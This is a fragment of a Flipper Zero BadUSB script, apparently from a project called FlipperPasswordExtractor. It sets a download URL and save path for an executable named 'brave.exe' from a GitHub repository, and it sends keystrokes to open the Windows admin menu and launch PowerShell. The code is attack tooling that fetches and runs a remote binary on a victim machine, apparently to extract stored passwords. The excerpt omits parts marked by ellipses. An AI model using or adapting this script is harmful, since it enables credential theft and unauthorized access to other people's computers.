...
let script = [
    ...
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordExtractor/raw/master/build/brave.exe';", // URL of the executable
    "$exePath = '.\\brave.exe';", // Path where the executable will be saved in the current directory
...
badusb.press("GUI", "x");//Open admin tools menu
	delay(300);
badusb.press("a");//Select PowerShell
	delay(1500);
badusb.press("LEFT");//Select PowerShell
	delay(500);
badusb.press("ENTER");//Select PowerShell
	delay(2500);
